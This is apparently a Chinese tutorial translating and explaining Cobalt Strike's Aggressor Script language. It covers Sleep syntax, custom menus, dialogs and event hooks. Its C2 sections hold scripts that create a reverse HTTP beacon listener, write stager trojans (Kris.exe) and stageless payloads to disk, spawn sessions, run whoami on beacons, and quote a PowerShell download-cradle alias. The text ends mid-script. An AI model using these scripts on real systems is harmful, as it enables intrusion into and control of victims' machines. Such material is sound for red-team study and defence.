---
title: Aggressor-Script
---

# Sleep环境的搭建

>  C2：Cobalt Strike，一款多人运动工具，常常使用再后渗透阶段

> Aggressor Script：是C2 3.0以上版本的一个内置的脚本语言，他是由Sleep脚本解析，Sleep脚本目前国内是没有中文版本的，可能是因为使用的人不多，在在后面我会去把这个语言进行翻译；在CS 3.0 以上的版本，菜单、选项、事件、都有默认的default.cna构建。我们可以使用一些IRC、Webhook去对接机器人和监控，比如瞎子哥的Server上线监听，以及梼杌等插件的编写，所以本文也会在他们的代码基础上去解释一些东西

由于 Aggressor Script是由Sleep解析的，所以我们先要安装一下这个语言的解释器，这个语言是基于Java的脚本语言

Sleep语言下载地址：http://sleep.dashnine.org/download/sleep.jar



* 快速使用：
  `java -jar sleep.jar`:
  ![image-20201212181400822](/images/Aggressor-Script/image-20201212181400822.png)

* 输出 hello word：

  新建一个 cna 文件，cna是Aggressor Scrip脚本的后缀，然后在里面写：

  ```java
  println("hello word");
  ```

  然后加载一下：
  ![image-20201212181921731](/images/Aggressor-Script/image-20201212181921731.png)

  运行出第一个程序

  


# 简介

在 C2 中，我们可以打开 Aggressor Script的控制台

![image-20201212182434257](/images/Aggressor-Script/image-20201212182434257.png)

这里我们可以使用 help查看一些帮助信息：
![image-20201212182524164](/images/Aggressor-Script/image-20201212182524164.png)

下面是介绍：

* ?
  进行一个简单的判断，返回值为True或者False，例如`? int(1) == int(2) `返回为False：

  ![image-20201212200112970](/images/Aggressor-Script/image-20201212200112970.png)

* e
  执行我们写的代码，相当于交互模式，如果不加上 `e` 的话是无法执行的，例如 `e println("hello woed")`:
  ![image-20201212200347928](/images/Aggressor-Script/image-20201212200347928.png)

* help

  这个就是现实帮助信息，我们在开头使用过：

  ![image-20201212200445136](/images/Aggressor-Script/image-20201212200445136.png)

* load
  加载 cna 脚本，这里我加载一个脚本：
  `load <cna path>`:
  ![image-20201212200656273](/images/Aggressor-Script/image-20201212200656273.png)

  这里加载的 cna 内容为：

  ![image-20201212200723162](/images/Aggressor-Script/image-20201212200723162.png)

  意思是创建一个 command  名字为 w，当输入w的时候就打印hello word。

  

* ls
  现实我们目前加载的 cna 代码：

  ![image-20201212200842985](/images/Aggressor-Script/image-20201212200842985.png)

* proff ：静止 cna 脚本运行Sleep的语法（不明白具体的作用）

* profile：统计 cna 脚本使用了哪些 Sleep的语法：
  ![image-20201212204315502](/images/Aggressor-Script/image-20201212204315502.png)

* pron 机翻：运行 cna 脚本运行Sleep的语法

* reload：重新加载 cna脚本，还是用我们刚刚的脚本举例：
  我先修改 cna 中的内容：
  ![image-20201212204558822](/images/Aggressor-Script/image-20201212204558822.png)

  在到 控制台输入一下：

  ![image-20201212204630060](/images/Aggressor-Script/image-20201212204630060.png)

  没有改变，我们重载一下在运行：
  ![image-20201212204717719](/images/Aggressor-Script/image-20201212204717719.png)

  

* troff： 关闭函数跟踪，也就是我们不显示函数运行的具体情况：
  ![image-20201212205115530](/images/Aggressor-Script/image-20201212205115530.png)

* tron:   开启函数跟踪，显示我们运行时的具体情况：
  ![image-20201212205157768](/images/Aggressor-Script/image-20201212205157768.png)

  发现我们运行的情况，在1.cna的第三行，我们输出 hello my friend

* x：执行一个计算，比如1+1什么的，这里需要注意，两个数字之间需要间隔开，不然会报错：


  ![image-20201212205540853](/images/Aggressor-Script/image-20201212205540853.png)

  



## 使用不带GUI的C2

我们可以使用 **agscript** 运行一个不使用 GUI 的C2客户端，简单的来说就是命令行的操作：

服务器上启动后，在本地输入：

```shell
./agscript [host] [port] [user] [password]
```

![image-20201212210453219](/images/Aggressor-Script/image-20201212210453219.png)

  只会给我们一个建议的 Aggressor的控制台，我们可以在后面跟上 cna 的配置文件，在瞎子哥的Server上线中使用过这个东西：
![image-20201212210803564](/images/Aggressor-Script/image-20201212210803564.png)

他使用这样的方式呢可以做到在云端加载 cna 不错过推送，如果在本地加载的话就是只能打开客户端的时候才会接收到推送



使用这样的方式会在链接的时候优先执行我们的cna代码，我们在服务端的写下这么一个 cna ：

```
on ready {
	println("多人运行已经准备好了！准备起飞！！！！"); # 登录显示信息
}
```

然后运行，显示了我们的信息：
![image-20201212212726236](/images/Aggressor-Script/image-20201212212726236.png)

## Sleep快速入门

> 因为我是直接翻译的官方文档，所以我顺便也把这里翻译一下

- 数字
- 字符串
- Arrays
- Lists
- Stacks
- Sets
- Hashs

这是他的数据类型，首先我们要注意的是，他的格式是一定需要带上空格的。

```java
$name = "kris"; # 字符串变量的命名
$age = 18; # 数字型变量命名

Arrays类型：
@user_list = @("kris",18,"四川","单身"); # Sleep的阵列（列表）是类似python的那种任何元素的集合，不需要元素的类型统一
										也即是一种复合数据类型。
println(@name_list[0]); # 下标输出信息
 
Hashs类型
%dict["name"] = "kris";
%dict["age"] = 18;
%dict["address"] = "sichuan"; # 使用%号创建，有点和python的字典类似
    
println("Dict is ".%dict);

```

### Arrays

![image-20201213142244276](/images/Aggressor-Script/image-20201213142244276.png)

![image-20201213142254825](/images/Aggressor-Script/image-20201213142254825.png)

这样可以对列表中的元素进行输出。格式话输出的语法是使用 `.` 进行拼接。

### Hashs

![image-20201213143803659](/images/Aggressor-Script/image-20201213143803659.png)

![image-20201213143841540](/images/Aggressor-Script/image-20201213143841540.png)



### 遍历

语法：

```java
@name_list = @('kris',18,'sichuan');
foreach $var (@name_list)
{
   println($var);
}
```

![image-20201213144333561](/images/Aggressor-Script/image-20201213144333561.png)



### Push

这个类似我们的python中的append方法，在列表的最后面添加数据：

```java
@names = @("Hellen","Abao");
push(@names,"kris");


print("name :".@names);
```

![image-20201213145224932](/images/Aggressor-Script/image-20201213145224932.png)



## 简单的交互程序

首先先看代码：

```java
sub say_hello{
	println("hello ".$1);# 定义一个函数，打印hello + 得到的参数
}

command N {
	say_hello($1); # 定义一个命令，并且将接受到的第一个参数传递给 say_hello函数。
}
```

运行结果：

![image-20201213150323291](/images/Aggressor-Script/image-20201213150323291.png)

使用定义的 N 命令，在他的后面传递第一个名字，就会输出 hello + 你输入的名字，我们定义 N 命令的内容将数据传输带 SAY_hello，所以就输出了 hello + 我们的名字

* sub 定义函数
  首先介绍定义函数的方式，在Sleep中，我们使用 sub 进行函数的定义，比如我们定义一个加法函数：

  ```
  sub add {
  	return $1."+".$2."=".($1 + $2);
  }
  
  $sum = add(1,2);
  println($sum);
  ```

  ![image-20201213151226880](/images/Aggressor-Script/image-20201213151226880.png)

  这里发现，没有和我们预期的一样输出 1+2=3，这是为什么呢？我们在前面说过，Sleep是由比较严格的空格要求，在 `($1+$2)`这个地方，我们没有正确的使用空格，所以报错，我们只要将他们的格式拿出来就好：
  ![image-20201213151516075](/images/Aggressor-Script/image-20201213151516075.png)

  这样就编辑出了一个函数



* command定义命令
  语法：

  ```shell
  command <你想要的命令>
  	{
  		执行的代码;
  	}
  ```

  这里是我们使用我们自定义的函数进行交互的，在上面我们是使用的 N 去执行 say_hello的函数体，我们现在只使用一个  command 起到相同的作用：

  ```shell
  command N {
  	println("hello ".$1);
  }
  ```

  ![image-20201213152019734](/images/Aggressor-Script/image-20201213152019734.png)

  这里说明，我们可以直接写函数，也可以调用

  `$1` 是我们接受到的第一个参数，以此类推：`$2`是第二个参数......

  

## 彩色输出

简单的来说就是让我们的控制台输出一个带颜色的字体：

```shell
println("\c0This is my color");
println("\c1This is my color"); # 这是黑色
println("\c2This is my color");
println("\c3This is my color");
println("\c4This is my color");
println("\c5This is my color");
println("\c6This is my color");
println("\c7This is my color");
println("\c8This is my color");
println("\c9This is my color");
println("\cAThis is my color");
println("\cBThis is my color");
println("\cCThis is my color");
println("\cDThis is my color");
println("\cEThis is my color");
println("\cFThis is my color");
```

![image-20201213145856195](/images/Aggressor-Script/image-20201213145856195.png)

# Cobalt Strike

## C2客户端

在3.0版本以上，客户端界面的大部分东西都是使用 deafult.cna 构建出来的，菜单、默认按钮，包括我们日常上线的时候 Event log 的格式化输出。接下来我们就一一介绍

### 键盘快捷键

语法：

```shell
bind <想绑定的组合键>
	{
		按下快捷键执行的命名;	
	}
```

我们绑定一个来试试看：

```shell
bind Ctrl+H {
	show_message("使用键盘快捷键哦！"); # 弹窗显示我们的消息
	elog("使用了快捷键！"); # 在 Event Log位置显示信息
}
```

![image-20201213153451637](/images/Aggressor-Script/image-20201213153451637.png)

当我们 按下 Ctrl + H 的组合键的时候，我们就直接弹出信息，并且按照代码一样在 Event log下输出，组合键可以随便写，你也可以=只写一个 H，都是可以的，加上 Ctrl只是约定俗，也可以使用对个修饰符，比如 Ctrl + Shift + H。



### 菜单编写

菜单就是下面这样的东西：

![image-20201213154112698](/images/Aggressor-Script/image-20201213154112698.png)

我们可以自己定义想要的菜单或者将我们的二级菜单添加到已经存在的主菜单下，创建自定义菜单语法如下：

```shell
popup <菜单函数名>{
	        item("&<二级菜单显示>", {点击时执行的代码，或者函数}); # 第一个子菜单
        	separator(); #分割线
        	item("&<二级菜单名字>", {点击时执行的代码，或者函数}); # 第二个子菜单
        	separator(); #分割线
}

menubar("一级菜单显示名", "菜单函数名");
```

我们现在定义一个简单的菜单：

```shell
popup my_help{
	item("&这是百度",{url_open("http://www.baidu.com")});
	separator();
	item("&这是谷歌",{url_open("http://www.google.com")}); # url_open()这个函数是用来打开网站的
	
}
menubar("帮助菜单", "my_help"); # 菜单函数，一定要加上
```

![image-20201213155650731](/images/Aggressor-Script/image-20201213155650731.png)

当我们点击以后，会直接打开百度的链接：

![1](/images/Aggressor-Script/1.gif)



如果我们并不想创建新的菜单，而是想在默认的菜单上增加，我们可以这样做：

```
popup help{
	item("&关于汉化",{show_message("4.1汉化 by XXX ")});
	separator();
}
```

![image-20201213160405665](/images/Aggressor-Script/image-20201213160405665.png)
![image-20201213160534566](/images/Aggressor-Script/image-20201213160534566.png)

这样我们就在与原有的基础上加上了一个关于汉化的提示，这里我们是加载外部的 cna ，你可以修改默认的 default.cna来添加自己的信息。

* 右键菜单的选择

  除了上面说的那样的菜单，我们还会在点击右键的时候打开菜单，如下所示：
  ![image-20201214094754154](/images/Aggressor-Script/image-20201214094754154.png)

  创建这样的菜单我们的语法为：

  ```shell
  popup beacon_bottom{
      	item("&关于作者", { url_open("https://wgpsec.org"); });
          	}
  ```

  ![image-20201214095427815](/images/Aggressor-Script/image-20201214095427815.png)

  我们在任何的菜单里面都可以嵌套菜单，就整出一个多级菜单的样子，我们把上面的代码进行修改

  ```shell
  popup beacon_bottom{
  	menu "关于作者"{
      	item("&博客", { url_open("https://wgpsec.org"); });
  		item("&QQ", { show_message("1574991635"); });
          	}
  		}
  ```

  ![image-20201214100107462](/images/Aggressor-Script/image-20201214100107462.png)

  多级菜单就是多了一个`menu "右键显示的信息"{}` 的写法，这里和上面菜单编写最大的区别就是没有`menubar`的写法，因为我们是直接在右键菜单上进行修改的，也就是原有菜单上修改



### 输入框的编写

在一些时候，我们想整一个输入框。让用户输入一些东西的时候，可以使用 dialog 数据模型进行编写，他需要接受三个参数

`$1` 对话框的名称

`$2` 对话框里面的内容，可以写多个

`$3` 回调函数，当用户 使用 dbutton_action 调用的函数

```shell
popup test {
	item("&收集信息",{dialog_test()}); # 建立一个菜单栏目，点击收集信息时就调用show函数
}

menubar("测试菜单","test"); # 注册菜单

sub show {
	show_message("dialog的引用是：".$1."\n按钮名称是：".$2);
	println("用户名是：".$3["user"]."\n密码是：".$3["password"]);# 这里show函数接收到了dialog传递过来的参数，分

}
sub dialog_test {
	$info = dialog("这是对话框的标题",%(username => "root",password => ""),&show); #第一个是菜单的名字，第二个是我们下面定义的菜单显示内容的默认值，第三个参数是我们回调函数，触发show函数的时候显示，并将我们的输入值传递给他
	drow_text($info,"user","输入用户名："); # 设置一个用户名输入条
	drow_text($info,"password","输入密码"); 
	dbutton_action($info,"马上起飞！"); # 点击按钮，触发回调函数
	dbutton_help($info,"http://www.wgpsec"); # 显示帮助信息
	dialog_show($info); # 显示文本输入框
}
```



定义 diolog 的时候，会将用户输入的东西传递给第三个参数设置的函数，dialog传递的时候一共会传递三个参数给函数

`$1`  为 dialog的引用 

`$2` 按钮的名称 

`$3 `对话框输入的值

![image-20201217142103846](/images/Aggressor-Script/image-20201217142103846.png)

![image-20201217142130910](/images/Aggressor-Script/image-20201217142130910.png)

drow_text是指文对话框的输入，语法如下：

```shell
drow_text("变量名","提示语句");
```

dbutton_action  将操作按钮添加到dialog 中，当点击这个按钮以后，会关闭对话框，并且传输数据到回调函数中

```shell
dbutton_action($info,"按钮的名字")
```

dbutton_help 将help按钮添加到对话框中，点击help跳转网页去

```shell
dbutton_help($info,"https://www.wgpsec.org")
```

dialog_show 显示对话框



### 事件处理

Event Log 就是我们经常看到的那个东西，当有主机上线、用户登录或者离开等，都可以在上面显示出来：

![image-20201213161603255](/images/Aggressor-Script/image-20201213161603255.png)

这是状态栏：

![image-20201213163750009](image-20201213163750009.png)

这里我是用官方的例子来解释：

```shell
set EVENT_SBAR_LEFT { # 设置 Event Log状态栏左边的信息
	return "[" . tstamp(ticks()) . "] " . mynick()." 正在线上！！"; #显示的信息，tstamp(ticks())是显示时间。mynick()显示名字这里我在后面加上一个正在线上。
}

set EVENT_SBAR_RIGHT {
	return "[lag: $1 $+ ]";
}
```

当我修改以后再使用以后，我们发现我们的状态栏发生改变了

![image-20201213162001867](/images/Aggressor-Script/image-20201213162001867.png)



我们再举一个例子，我们知道当有用户上线以后，会在Event log里面显示，但是这样我们可能看起来会不是很明显，我现在想要上线的时候，弹窗告诉我们谁谁谁链接了我们的C2服务器，并且修改Event Log显示的信息，那么我们就可以修改 event_join：

> event_join：给定我们两个值：
>
> `$1`-谁加入了团队服务器
>
> `$2`-消息发布的时间

```
on event_join {
	show_message($1."加入到服务器中！");
	elog(mynick()."来了！");
}
```

![image-20201213165900331](/images/Aggressor-Script/image-20201213165900331.png)



这样我们就很清楚那些人加入了我们的 C2 服务，当我们使用自己的 cna 时，默认的 cna 就不会加载，由于篇幅的限制，我在后续会把所有的支持的 事件 写出来，这里我们也能够懂得 Server 上线是使用的第一行代码，当机器上线的时候我们执行的代码：

![image-20201213171747495](/images/Aggressor-Script/image-20201213171747495.png)

官方事件：https://www.cobaltstrike.com/aggressor-script/events.html





# 数据模型（Data Model）

> 数据模型我感觉有点像自带的一些函数，我们输入这些函数得到数据

C2的服务端户把我们所有的数据保存在服务器上，例如主机信息、数据，下载的东西等，所以当我们加入C2的服务器时，我们可以直接将其他用户保存过的信息保存下来

## 数据接口（Data Api）--data_query()

> C2中所有的数据模型也会在后面翻译出来，我先简单的是用几个举例

| Mode        | Function                   | 含义                                                     |
| ----------- | -------------------------- | -------------------------------------------------------- |
| targets     | 存储的目标信息             | 显示上线过的主机信息                                     |
| archives    | 显示最近的信息             | 显示最近的输出信息（慎用很卡）                           |
| beacons     | 显示所有的受感染的主机信息 | 显示在线和上线过的主机                                   |
| credentials | 显示凭据信息               | 我们抓取过的密码信息和制作的票据信息                     |
| downloads   | 显示下载信息               | 显示我们在受控端下载的信息                               |
| keystrokes  | 记录键盘输入               | 当我们选择进程记录键盘的时候，会将得到的键盘信息记录下来 |
| screenshots | 屏幕截图显示               | 显示我们截图的二进制信息流                               |
| sites       | 托管的资产                 | 看起来是我们创建的监听的端口个Stager回连的端口           |
| servers     |                            |                                                          |

上面的这些数据结构（可以理解为函数）使用他们可以返回对应的信息，以数组的形式返回，我们可以通过 Aggressor Script的控制台进行查看，例如：

![image-20201213191438105](/images/Aggressor-Script/image-20201213191438105.png)

支持下标索引：

![image-20201213192346704](/images/Aggressor-Script/image-20201213192346704.png)

字典的操作也可以：

![image-20201213192414888](/images/Aggressor-Script/image-20201213192414888.png)

我们可以写一个 cna 来获取当前主机的信息：

```java
command info{
    println("IP地址：".targets()[$1]["address"]."\n操作系统：".targets()[$1]["os"]."\n用户名：".targets()[$1]["name"]);
}
```

运行查看结果：

![image-20201213193121595](/images/Aggressor-Script/image-20201213193121595.png)

我们输入的 0 和 1 就是取的对应的下标

当然我们也是可以修改数据模型的输出的.



# Listeners

> 用来显示存在的监听器

监听器就是我们常常使用的，用来接收C2马子的流量的东西和写入荷载的信息；监听器会在生成荷载的时候将我们选择的某一个监听器的信息写入，在第二阶段时候，利用Stager加载我们的配置信息，如果是一个 Beacon_HTTP 的话，那么写入的东西包括 IP、端口、回连地址等信息，如下

![image-20201213202406153](/images/Aggressor-Script/image-20201213202406153.png)



Listener API 会将所有的监听信息显示出来，我们可以使用 `Listeners()`显示所有的信息，如果我们有本地的监听，例如 SMB 的监听的话，我们就需要使用 `Listeners_local` 显示本地的信息，如下：

![image-20201213210924614](/images/Aggressor-Script/image-20201213210924614.png)

这样我们可以显示我们的信息，但是我们没法详细的查看每一个Listener的详细信息，那么我们可以使用 Listener_info 函数来显示我们所有的信息

* Listener_info 的使用方式：

  ```shell
  listener_info("想要查看的监听器信息")
  ```

  ![image-20201213213825612](/images/Aggressor-Script/image-20201213213825612.png)

  我们可以将两者结合起来显示所有的监听器的信息，我们把Listeners 得到的名称传到 listener_info:

  ```shell
  command show_info {
  	foreach $name (listeners()) {
  		println("\n== $name 的配置信息 == ");
  		foreach $key => $value (listener_info($name)) {
  			println("$[10]key : $value");
  		}
  	}
  }
  ```

  ![image-20201213220411582](/images/Aggressor-Script/image-20201213220411582.png)

  上面的 cna 加载以后就能得到这样的信息

* Listener_create_ext 创建新的监听器

  在 GUI 界面中我们可以直接创建，其实那个 GUI 创建也是调用的 Listener_create_ext，进行创建，下面是他个我们定义好的参数：

  `$1`-侦听器名称
  `$2`-有效负载（例如，windows / beacon_http / reverse_http）
  `$3`-带有键/值对的映射，这些键/值对指定了监听器的链接信息，host和port等

  `$2`的可选项为：

  | payload                            | 类型          |
  | ---------------------------------- | ------------- |
  | windows/beacon_dns/reverse_dns_txt | Beacon DNS    |
  | windows/beacon_http/reverse_http   | Beacon HTTP   |
  | windows/beacon_https/reverse_https | Beacon HTTPS  |
  | windows/beacon_bind_pipe           | Beacon SMB    |
  | windows/beacon_bind_tcp            | Beacon TCP    |
  | windows/beacon_extc2               | External C2   |
  | windows/foreign/reverse_http       | Foreign HTTP  |
  | windows/foreign/reverse_https      | Foreign HTTPS |

  `$3`的可选项：

  | Key     | DNS          | HTTP/S           | SMB       | TCP(Bind) |
  | ------- | ------------ | ---------------- | --------- | --------- |
  | althost |              | HTTP Host Header |           |           |
  | bindto  | bind  port   | bind  port       |           |           |
  | beacons | C2 Hosts     | C2 Hosts         |           |           |
  | host    | strging Host | strging Host     |           |           |
  | port    | C2 port      | C2 port          | pipe name | port      |
  | profile |              | profile variant  |           |           |
  | proxy   |              | proxy config     |           |           |

  按照这样的方式，我们使用 cna 配置一个 Beacon HTTP 的监听：

  语法：

  ```shell
  listener_creat_text("创建的名称","选择的payload",%("选择的payload需要填上的参数"));
  ```

  实践

  ```shell
  listener_create_ext("我的HTTP监听","windows/beacon_http/reverse_http",%(host=>"IP或者域名",port=>1080,beacons =>"IP或者域名"));
  printAll(listeners());
  println("创建成功！");
  ```

  由于我的端口被占用，我先删除一下：

  ![image-20201213222945393](/images/Aggressor-Script/image-20201213222945393.png)

  然后运行 cna 并查看：

  ![image-20201213223523971](/images/Aggressor-Script/image-20201213223523971.png)
  ![image-20201213223612288](/images/Aggressor-Script/image-20201213223612288.png)
  成功创建，我们这里的参数并没有全部按照啥要求填满，和我们平时 GUI 创建是一样的。在原文中提到过一个 代理问题 ，这里我没写，因为我感觉用的比较少

* 会话传递 

  在我们日常使用的时候，我们会将会话传递(Spawn)，比如将会话传递到 MSF 中，或者传递 SMB 到其他会话，下面是这个操作的源码：

  ```shell
  item "&Spawn" {
  	openPayloadHelper(lambda({
  		binput($bids, "spawn x86 $1");
  		bspawn($bids, $1, "x86");
  	}, $bids => $1));
  }
  ```

  这里面设计到多个 数据模型 ，我们一个一个的讲解。

  * openpayloadHelper： 打开我们拥有的 Listener 会话框：

  * bspawn：创建新的会话，需要传递一个会话ID
  
```java
    popup beacon_bottom{
    	item("&会话传递",{openPayloadHelper(lambda({
    	bspawn($bid, $1);
  	println("我们传递的监听器是".$1)},# 
        $bid => $1));});
  }
```


​    
当openpayladhelper打开存在的Listener会话时，他需要接受一个值，这个值是选定的监听器，然后这里将这个值传递给bspawn，bsapwn需要接受的第一个值也是选定的监听器（bspawn是生成一个新的会话），所以这里我们的将选择的监听器传递给bspawn就可以传递会话，这个地方的写法是固定的，单独的将openPayloadHelper使用是不可以的，但是baspwn是可以的，当运行上面的内容以后，我们可以查看`$1`的值，你会发现就是我们所选择的监听器：
​    
![image-20201214112030750](/images/Aggressor-Script/image-20201214112030750.png)
​    
![image-20201214112048256](/images/Aggressor-Script/image-20201214112048256.png)

![image-20201214112103471](/images/Aggressor-Script/image-20201214112103471.png)

​    

这样我们也算是重写了我们 Spwan的数据模型
    
官方菜单写法中，使用的是 `binput`，这个 数据模型 是用来在Becon 中显示我们执行的命令的，下面是官方的写法的结果：
![image-20201214112330479](/images/Aggressor-Script/image-20201214112330479.png)



## Stagers

> Stager我只能根据我的理解来描述，肯定会和很多师傅的不相同，仅作为参考

Stage（阶段）指的是分阶段，他没有含义，仅仅是指的这种类型，分阶段木马一般是我们在目标上无法使用较大的文件或者命令时使用，使用这样的方式分阶段的一个一个的从远端下载我们的代码，然后传输到受控段

Stager指加载器，例如下面这个截图：

![image-20201214141457999](/images/Aggressor-Script/image-20201214141457999.png)

这里我们使用 Stager 去请求我设置的URL，所以我们可以将Stager理解为加载器，加载远端的代码；在官方文档中是这么解释的：Stager 是一个微型程序，它可以下载有效荷载并且接收，适合运用于有大小限制的程序，例如用户的驱动攻击。

我们可以适应 stager 数据模型将我们的信息打印出来，使用它需要输入两个参数

`$1` Listener 名字

`$2` 选择位数 x86 | x64

我们在控制台可以查看一下：
![image-20201214142943361](/images/Aggressor-Script/image-20201214142943361.png)

其次就是使用 artifact_stager 数据模型生成我们的可执行文件，或者其他类型的木马，他需要接受3个参数：
`$1` 监听器的名字

`$2` 生成文件的类型，比如exe

`$3` 选择位数 x86 | x64

下面是`$2` 的可选的参数

| 类型       | 说明                  |
| ---------- | --------------------- |
| dll        | 一个 dll 程序         |
| exe        | 一个可执行的 exe 程序 |
| powershell | 一个powershll执行程序 |
| python     | 一个python的程序      |
| raw        | 原始文件              |
| svcexe     | 一个svc.exe程序       |
| vbscript   | 生成Vbs文件           |

我们使用 artifact_stager进行生成：

```shell
$data = artifact_stager("Tencent", "exe", "x64"); #选择监听器、生成类型、位数

$handle = openf(">Kris.exe"); # 生成的路径，这里是在当前执行的路径下
writeb($handle, $data); # 写入
closef($handle); # 关闭写入，不关闭会一直卡住	
```

我们执行:

![image-20201214145716511](/images/Aggressor-Script/image-20201214145716511.png)

然后运行这个木马，看看是否可以上线：

![image-20201214145811630](/images/Aggressor-Script/image-20201214145811630.png)

可以上线，在GUI中也是使用的这个 数据模型 创建。



## Local Stagers

> 本地的Stager信息

我们上面提到了监听器的信息有 本地监听器和云端监听器，那么对于本地的正向链接的 TCP Listener 我们就可以使用 stager_bind_tcp 这个数据模型来查看，这个数据模型只能查看 TCP 类型的 Stager，他需要接受三个参数：

`$1` 我们创建的 TCP 监听名字

`$2` 监听器的位数

 `$3` 监听器的链接端口



我们使用下面的代码查看一下我们的 TCP stager信息：

```shell
$TcpStager = stager_bind_tcp("你的TCP监听器名称","位数","bind to 端口");
elog($TcpStager);
```

![image-20201215142818777](/images/Aggressor-Script/image-20201215142818777.png)

![image-20201215142751398](/images/Aggressor-Script/image-20201215142751398.png)

实测加了端口也没有变化：

![image-20201215142952923](/images/Aggressor-Script/image-20201215142952923.png)





## Named Pipe Stager

Pipe Stager是内网渗透中，用于不能出网的主机的一种加载器，他只有 X86 的选择，我们可以使用 stager_bind_pipe 数据模型导出对应的 SMB 监听，他需要接受的参数如下：

`$1` 监听器的名称

他只需要这一个参数，CS4.0以后我们创建 SMB 链接只需要填写监听器名称，其他的都会自动填上。

```shell
$SMB_stager = stager("SMB");
elog($SMB_stager);
```

![image-20201215143849447](/images/Aggressor-Script/image-20201215143849447.png)



## Stageless Payloads

stageless 和stageless相反，指的是无阶段；stageless payloads 是指无阶段的荷载信息，我们可以使用 payload 数据模型导出所有的信息：

`$1` 监听器的名字

`$2`机器位数 x86 | x64

`$3` 进程名字

```shell
$data = payload("Tencent", "x64");

$handle = openf(">out.bin");
writeb($handle, $data);
closef($handle);
```

![image-20201215151750713](/images/Aggressor-Script/image-20201215151750713.png)

保存成功，然后我们可以使用 hex 打开看看内容：

![image-20201215151825407](/images/Aggressor-Script/image-20201215151825407.png)





# Beacon

> 信标，它是C2在异步开发后的代理（机翻...），个人理解是指上线的主机

## 元数据

C2在我们的（主机）信标上线以后，都会为他们分配一个独一无二的会话 ID，这个ID是一个随机数，Cobalt Strike将任务和元数据与每个信标的ID关联，我们可以使用 beacon_ids 数据模型获得当前所有会话的 ID 号码：

```shell
x beacon_ids() #获取所有的会话ID
```

![image-20201215153615139](/images/Aggressor-Script/image-20201215153615139.png)

我们可以利用得到的  会话ID 使用 beacon_info 数据模型得到所有的数据，我们会返回一个数组：

```shell
x beacon_info(beacon_ids()[0]) #获取所有信息
```

![image-20201215153945572](/images/Aggressor-Script/image-20201215153945572.png)

可以使用字典的操作，

```shell
x beacon_info(beacon_ids()[0])["os"] #获取os信息
```



![image-20201215154130011](/images/Aggressor-Script/image-20201215154130011.png)



于是我们可以循环取出这个会话ID的所有信息：

```shell
command show_all {
	foreach $entry (beacons()) { # 循环取出 会话ID
		println("== "."会话ID"."【". $entry['id'] ."】"."的信息如下"." ==");
		foreach $key => $value ($entry) { # 根据 ID 以次取出对应的 key和value
			println("$[15]key : $value");
		}
		println();
	}
}
```

![image-20201215154601528](/images/Aggressor-Script/image-20201215154601528.png)



除此以外还可以使用 beacons 数据模型返回所有信息：

![image-20201215154750767](/images/Aggressor-Script/image-20201215154750767.png)



## Alias

我们可以使用 Alias 为Beacon的添加新的别名，和Aggressor Script一样，我们可以自定义函数或者代码

他有三个参数：

`$0` 是我们起的别名和传输的参数

`$1` 是当前会话的 ID

`$2-3-4....`第二个参数及以后，就是我们 是我们传递的参数，他们由空格隔开，我们举一个例子：

```shell
alias info {
	blog($1,"我的名字是 $2 ，今年 $3 岁了，住在 $4 ");
}
```

![image-20201215173708003](/images/Aggressor-Script/image-20201215173708003.png)



**一定要注意格式！变量两边是空格，不然会运行不上，如下：**

![image-20201215173830729](/images/Aggressor-Script/image-20201215173830729.png)



## Reacting to new Beacons

我们可以使用 beacon_initial 这个事件来为我们主机上线是执行操作，这里我们设置一下，当主机上线是读取他的信息，然后弹处窗口告诉我们，beacon_initial 触发时会返回一个 会话 ID，也只会返回这一个值，我们可以利用这个 会话ID 去读取信息：

```
on beacon_initial {
	show_message("你有新的主机上线！\n会话ID为：$1 \nOS为：".beacon_info($1,"os")."\n内网地址为:".beacon_info($1,"internal")); 
}
```

 

![image-20201215175511736](/images/Aggressor-Script/image-20201215175511736.png)



## Reacting to new DNS Beacons

但是上面的这种方式是不适合DNS上线的，因为当DNS主机上线时，是没有进行数据交互的，需要我们主动切换数据的交互类型，我们使用上面的的代码试试看：

![2](/images/Aggressor-Script/2.gif)

没有触发我们的配置，那么当我们改变他的通信方式以后看看结果：

![image-20201215194614464](/images/Aggressor-Script/image-20201215194614464.png)

切换以后我们就得到了回应，为了解决这种问题，我们就可以使用 beacon_initial_empty 事件在得到一个 DNS 信标的时候执行命令

他和 beacon_initial 一样，第一个参数是得到的新的信标的 会话ID，我们编写下面的代码，当 DNS 信标回来以后我们自动执行切换通信方式:

```shell
on beacon_initial_empty {
	bmode($1, "dns-txt");
	bcheckin($1);
}

on beacon_initial {
	show_message("你有新的主机上线！\n会话ID为：$1 \nOS为：".beacon_info($1,"os")."\n内网地址为:".beacon_info($1,"internal")); 
}
```

* bmode 数据模型 可接受2个参数，用于切换数据传输方式
  `$1` DNS信标的 会话ID

  `$2` 修改 DNS 信标的会话方式（例如dns，dns6或dns-txt）

* bcheckin 数据模型 接受一个参数，用来强制回连
  `$1` 信标的 会话ID

上面的代码实现的作用是，当我们的 DNS 信标回连以后，切换 DNS信标 的数据方式，并且要求强制回连，然后在打印我们的信息，运行结果如下：

![3](/images/Aggressor-Script/3.gif)

这样就解决了问题



## beacon_bottom && beacon_top

在信标右键加上我们的菜单，和最开头的操作是一样的，使用这个 beacon_bottom HOOK 可以建立一个 信标 的右键选项，这个右键选项会在最后一行加上，如果想要让他显示在最顶端的话，我们可以使用 beacon_top HOOK将他的位置放在最上面：

```
popup beacon_bottom{
	item("&在最下方",{});
}

popup beacon_top{
	item("在最下方",{});
}
```

![image-20201215204731123](/images/Aggressor-Script/image-20201215204731123.png)



## The Logging Contract

在 C2 3.0以上的版本对用户的输入记录有非常详细的记录，对每个信标执行的命令都会以记录对应得时间戳和用户名，Cobalt Strike客户端中的Beacon控制台处理这些日志记录，这些记录都是使用 binput 数据模型进行操作，他需要接收两个参数：

`$1` 信标的会话ID

`$2` 在beacon 中显示的信息

```shell
binput(beacon_ids()[0],"在beacon中显示的信息");
```

![image-20201215211647740](/images/Aggressor-Script/image-20201215211647740.png)

我们这里是直接输出的东西，我们也可以将这个东西改为命令：

```shell
binput(beacon_ids()[0],bshell(beacon_ids()[0],"whoami"));
```

![image-20201215213105909](/images/Aggressor-Script/image-20201215213105909.png)



## Conquering the Shell

> 官方文档这里是在讲解 beacon 中的 powershell命令是怎么来的，我不做翻译，但是吧官方为文档贴出来

```shell
# powershell 的编写源码

alias powershell {
	local('$args $cradle $runme $cmd');
	
	# $0 is the entire command with no parsing.
	$args   = substr($0, 11);
	
	# generate the download cradle (if one exists) for an imported PowerShell script
	$cradle = beacon_host_imported_script($1);
	
	# encode our download cradle AND cmdlet+args we want to run
	$runme  = base64_encode( str_encode($cradle . $args, "UTF-16LE") );
